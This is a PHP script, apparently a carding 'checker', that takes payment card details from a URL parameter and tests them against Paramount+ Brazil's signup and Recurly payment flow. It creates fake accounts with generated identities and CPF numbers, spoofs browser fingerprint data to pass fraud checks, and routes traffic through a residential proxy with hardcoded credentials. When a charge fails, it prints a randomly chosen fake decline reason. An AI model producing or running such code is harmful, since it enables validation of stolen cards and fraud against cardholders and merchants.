﻿<?php
require_once 'vendor/autoload.php';
error_reporting(0);
set_time_limit(0);

class Numbercasa
{
	private function gerarNumeroAleatorio()
	{
		return mt_rand(10000, 99999);
	}

	public function obterNumeroAleatorio()
	{
		return $this->gerarNumeroAleatorio();
	}
}


class GeradorCEPBrasil
{
	public function gerarCEPAleatorio()
	{
		$parteNumerica = sprintf(
			"%08d",
			rand(0, 99999999)
		);

		return $parteNumerica;
	}
}

class GeradorEstadoBrasil
{
	public function gerarEstadoAleatorio()
	{
		$estados = [
			"Acre" => "AC",
			"Alagoas" => "AL",
			"Amapa" => "AP",
			"Amazonas" => "AM",
			"Bahia" => "BA",
			"Ceara" => "CE",
			"Distrito Federal" => "DF",
			"Espirito Santo" => "ES",
			"Goias" => "GO",
			"Maranhao" => "MA",
			"Mato Grosso" => "MT",
			"Mato Grosso do Sul" => "MS",
			"Minas Gerais" => "MG",
			"Para" => "PA",
			"Paraiba" => "PB",
			"Parana" => "PR",
			"Pernambuco" => "PE",
			"Piaui" => "PI",
			"Rio de Janeiro" => "RJ",
			"Rio Grande do Norte" => "RN",
			"Rio Grande do Sul" => "RS",
			"Rondonia" => "RO",
			"Roraima" => "RR",
			"Santa Catarina" => "SC",
			"Sao Paulo" => "SP",
			"Sergipe" => "SE",
			"Tocantins" => "TO",
			"Acre" => "AC",
			"Alagoas" => "AL",
			"Amapa" => "AP",
			"Amazonas" => "AM",
			"Bahia" => "BA",
			"Ceara" => "CE",
			"Distrito Federal" => "DF",
			"Espirito Santo" => "ES",
			"Goias" => "GO",
			"Maranhao" => "MA",
			"Mato Grosso" => "MT",
			"Mato Grosso do Sul" => "MS",
			"Minas Gerais" => "MG",
			"Para" => "PA",
			"Paraiba" => "PB",
			"Parana" => "PR",
			"Pernambuco" => "PE",
			"Piaui" => "PI",
			"Rio de Janeiro" => "RJ",
			"Rio Grande do Norte" => "RN",
			"Rio Grande do Sul" => "RS",
			"Rondonia" => "RO",
			"Roraima" => "RR",
			"Santa Catarina" => "SC",
			"Sao Paulo" => "SP",
			"Sergipe" => "SE",
			"Tocantins" => "TO",
			"Amapá" => "AP",
			"Pará" => "PA",
			"Tocantins" => "TO",
			"Roraima" => "RR",
			"Amapá" => "AP",
			"Pará" => "PA",
			"Tocantins" => "TO",
			"Roraima" => "RR",
			"Amapá" => "AP",
			"Pará" => "PA",
			"Tocantins" => "TO",
			"Roraima" => "RR",
			"Amapá" => "AP",
			"Pará" => "PA",
			"Tocantins" => "TO",
			"Roraima" => "RR",
		];
		$estadoAleatorio = array_rand($estados);
		return $estados[$estadoAleatorio];
	}
}

class MensagensDeDeclinio
{
	private $mensagens = [
		"Decline - Invalid Card Verification Number (CVN).",
		"Decline - Invalid account number.",
		"Decline - Insufficient funds in the account.",
		"Decline - Expired card.",
		"Decline - The card type is not accepted by the payment processor.",
		"Decline - General decline by the processor.",
		"Decline - Processor failure.",
		"Decline - customer's account is frozen",
		"Decline - Stolen or lost card.",
		"Decline - The authorization has already been reversed.",
		"Decline - The issuing bank has questions about the request.",
		"Decline - Generic decline. Request a different form of payment.",
		"Decline - Expired card. You might also receive this if the expiration date you provided does not match the date the issuing bank has on file."
	];
	public function obterMensagemAleatoria()
	{
		$mensagemAleatoria = $this->mensagens[array_rand($this->mensagens)];
		return $mensagemAleatoria;
	}
}

class GeradorCPF
{
	public function gerar_cpf()
	{
		function calcular_digito_verificador($cpf)
		{
			$soma = 0;
			for ($i = 0; $i < strlen($cpf); $i++) {
				$soma += $cpf[$i] * (10 - $i);
			}
			$resto = $soma % 11;
			if ($resto < 2) {
				return 0;
			} else {
				return 11 - $resto;
			}
		}
		$cpf = '';
		for ($i = 0; $i < 9; $i++) {
			$cpf .= rand(0, 9);
		}
		$cpf .= calcular_digito_verificador($cpf);
		$cpf .= calcular_digito_verificador($cpf);
		return $cpf;
	}
}

class GeradorAleatorio
{
	private function gerarSequenciaAleatoria($tamanho)
	{
		$caracteresPermitidos = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
		$sequenciaAleatoria = '';

		for ($i = 0; $i < $tamanho; $i++) {
			$indiceAleatorio = rand(0, strlen($caracteresPermitidos) - 1);
			$caractereAleatorio = $caracteresPermitidos[$indiceAleatorio];
			$sequenciaAleatoria .= $caractereAleatorio;
		}

		return $sequenciaAleatoria;
	}

	public function gerarSequenciaAleatoriaPublica($tamanho)
	{
		return $this->gerarSequenciaAleatoria($tamanho);
	}
}

class CardProcessor
{
	private $faker;
	private $config;

	public function __construct($config)
	{
		$this->faker = Faker\Factory::create('pt_BR');
		$this->config = $config;
	}

	public function processCard($cc, $mes, $ano, $cvv)
	{


		if ($ano < 100) {
			$ano = 2000 + $ano;
		}
		$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);

		$minhaInstancia = new Numbercasa();
		$numero_aleatorio = $minhaInstancia->obterNumeroAleatorio();

		$gerador = new GeradorAleatorio();
		$tamanhoDesejado = 16;
		$sequenciaGerada = $gerador->gerarSequenciaAleatoriaPublica($tamanhoDesejado);

		$gerador = new GeradorEstadoBrasil();
		$estadoSigla = $gerador->gerarEstadoAleatorio();

		$gerador = new GeradorCEPBrasil();
		$cepAleatorio = $gerador->gerarCEPAleatorio();

		$mensagensDeDeclinio = new MensagensDeDeclinio();
		$mensagem = $mensagensDeDeclinio->obterMensagemAleatoria();

		$request = new HTTP_Request2();
		$request->setCookieJar(true);
		$cookiejar = $request->getCookieJar();
		$config = $this->config;

		$basic_header = [
			'Host' => 'www.paramountplus.com',
			'user-agent' => $this->faker->firefox(),
			'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$request->setMethod(HTTP_Request2::METHOD_GET);
		$request->setCookieJar($cookiejar = new HTTP_Request2_CookieJar());
		$request->setConfig($config);
		$request->setHeader($basic_header);
		$purchase_url = 'https://www.paramountplus.com/br/';
		$request->setUrl($purchase_url);
		$response = $request->send();
		$response->getBody();

		$basic_header1 = [
			'Host' => 'www.paramountplus.com',
			'user-agent' => $this->faker->firefox(),
			'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'referer' => 'https://www.paramountplus.com/br/',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$request->setMethod(HTTP_Request2::METHOD_GET);
		$request->setHeader($basic_header1);
		$purchase_url1 = 'https://www.paramountplus.com/br/account/user-flow/f-upsell/';
		$request->setUrl($purchase_url1);
		$response = $request->send();

		$authToken = $this->getStr($response->getBody(), "CBS.Registry.login.authToken = '", "';");
		$productCode = $this->getStr($response->getBody(), '"region":"BR","rawPrice":"14.90","purchaseOfferPeriod":"1-week-trial","priceUnit":"M\u00eas","tier":1,"package_code":"CBS_ALL_ACCESS_AD_FREE_PACKAGE","code":"', '","recurlyCode":"pplus_intl_br_mobileonly_monthly","');
		$recurly_public_key = $this->getStr($response->getBody(), 'CBS.Registry.recurly_public_key = "', '";');

		$basic_heade2 = [
			'Host' => 'www.paramountplus.com',
			'user-agent' => $this->faker->firefox(),
			'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundary' . $sequenciaGerada . '',
			'accept' => 'application/json, text/plain, */*',
			'x-requested-with' => 'XMLHttpRequest',
			'origin' => 'https://www.paramountplus.com',
			'referer' => 'https://www.paramountplus.com/br/account/signup/createaccount',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$data = array(
			'fullName' => $this->faker->firstNameMale() . ' ' . $this->faker->lastName(),
			'email' => $this->faker->userName() . '.' . $numero_aleatorio . '@gmail.com',
			'password' => 'pedro12A@',
			'optIn' => 'true',
			'requiredAgreement' => 'true',
			'tk_trp' => $authToken,
		);

		$request->setMethod(HTTP_Request2::METHOD_POST);
		$request->setHeader($basic_heade2);
		$purchase_url2 = 'https://www.paramountplus.com/br/account/xhr/register/';
		$request->setUrl($purchase_url2);
		$request->addPostParameter($data);
		$response = $request->send();
		$response->getBody();

		$basic_header8 = [
			'Host' => 'api.recurly.com',
			'user-agent' => $this->faker->firefox(),
			'accept' => '*/*',
			'referer' => 'https://api.recurly.com/js/v1/field.html',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$request->setMethod(HTTP_Request2::METHOD_GET);
		$request->setHeader($basic_header8);
		$purchase_url8 = 'https://api.recurly.com/js/v1/risk/preflights?version=4.26.0&key=' . $recurly_public_key . '&instanceId=jmTJtJHggFjYGkJd';
		$request->setUrl($purchase_url8);
		$response = $request->send();
		$json = $response->getBody();

		$data = json_decode($json, true);
		$gatewayCodes = [];

		foreach ($data['preflights'] as $preflight) {
			$gatewayCodes[] = $preflight['params']['gateway_code'];
		}

		list($numero1, $numero2, $numero3, $numero4, $numero5, $numero6) = array_slice($gatewayCodes, 0, 6);

		$datacard = array(
			'first_name' => $this->faker->firstNameMale(),
			'last_name' => $this->faker->lastName(),
			'address1' => $this->faker->streetAddress . ' ' . $numero_aleatorio,
			'city' => $this->faker->city,
			'state' => $estadoSigla,
			'postal_code' => $cepAleatorio,
			'tax_identifier' => $this->faker->cpf(false),
			'tax_identifier_type' => 'cpf',
			'country' => 'BR',
			'token' => '',
			'number' => $cc,
			'browser[color_depth]' => '24',
			'browser[java_enabled]' => 'false',
			'browser[language]' => 'pt-BR',
			'browser[referrer_url]' => 'https://www.paramountplus.com/br/account/signup/submitpayment',
			'browser[screen_height]' => '864',
			'browser[screen_width]' => '1536',
			'browser[time_zone_offset]' => '180',
			'browser[user_agent]' => $this->faker->firefox(),
			'month' => $mes,
			'year' => $ano,
			'cvv' => '',
			'risk[0][processor]' => 'cybersource',
			'risk[0][gateway_code]' => $numero1,
			'risk[1][processor]' => 'cybersource',
			'risk[1][gateway_code]' => $numero2,
			'risk[2][processor]' => 'cybersource',
			'risk[2][gateway_code]' => $numero3,
			'risk[3][processor]' => 'cybersource',
			'risk[3][gateway_code]' => $numero4,
			'risk[4][processor]' => 'cybersource',
			'risk[4][gateway_code]' => $numero5,
			'risk[5][processor]' => 'cybersource',
			'risk[5][gateway_code]' => $numero6,
			'version' => '4.26.0',
			'key' => $recurly_public_key,
			'instanceId' => 'jmTJtJHggFjYGkJd',
		);

		$basic_header3 = [
			'Host' => 'api.recurly.com',
			'user-agent' => $this->faker->firefox(),
			'content-type' => 'application/x-www-form-urlencoded',
			'accept' => '*/*',
			'origin' => 'https://api.recurly.com',
			'referer' => 'https://api.recurly.com/js/v1/field.html',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$request->setMethod(HTTP_Request2::METHOD_POST);
		$purchase_url3 = 'https://api.recurly.com/js/v1/token';
		$request->setUrl($purchase_url3);
		$request->setHeader($basic_header3);
		$request->addPostParameter($datacard);
		$response = $request->send();

		$credit_card = $this->getStr($response->getBody(), '"credit_card","id":"', '"}');

		$datapayment = array(
			'token' => $credit_card,
			'm' => '1107329',
			'i' => '0',
			'productType' => 'monthly',
			'productCode' => $productCode,
			'tk_trp' => $authToken,
		);

		$basic_header4 = [
			'Host' => 'www.paramountplus.com',
			'user-agent' => $this->faker->firefox(),
			'content-type' => 'multipart/form-data; boundary=----WebKitFormBoundary' . $sequenciaGerada . '',
			'accept' => 'application/json, text/plain, */*',
			'x-requested-with' => 'XMLHttpRequest',
			'origin' => 'https://www.paramountplus.com',
			'referer' => 'https://www.paramountplus.com/br/account/signup/submitpayment',
			'accept-language' => 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		];

		$request->setMethod(HTTP_Request2::METHOD_POST);
		$request->setHeader($basic_header4);
		$purchase_url4 = 'https://www.paramountplus.com/br/account/xhr/processPayment/';
		$request->setUrl($purchase_url4);
		$request->addPostParameter($datapayment);
		$response = $request->send();


		if (strpos($response->getBody(), 'SUBSCRIBER')) {
			echo "Successful transaction #EV";
			exit();
		} else {
		        echo $mensagem;
			exit();
		}
	}

	private function getStr($string, $start, $end)
	{
		$str = explode($start, $string, 2);
		if (isset($str[1])) {
			$str = explode($end, $str[1], 2);
			return $str[0];
		}
		return '';
	}
}

$dados = $_GET['lista'];

list($cc, $mes, $ano, $cvv) = explode('|', $dados);

$config = [
	'ssl_verify_peer' => false,
	'ssl_verify_host' => false,
	'follow_redirects' => true,
	'adapter' => 'HTTP_Request2_Adapter_Socket',
	'proxy_host' => '93.190.142.57',
	'proxy_port' => 13347,
	'proxy_user' => '6881213-all-country-BR',
	'proxy_password' => '1w1iib41xe',
];

$cardProcessor = new CardProcessor($config);
$cardProcessor->processCard($cc, $mes, $ano, $cvv);

?>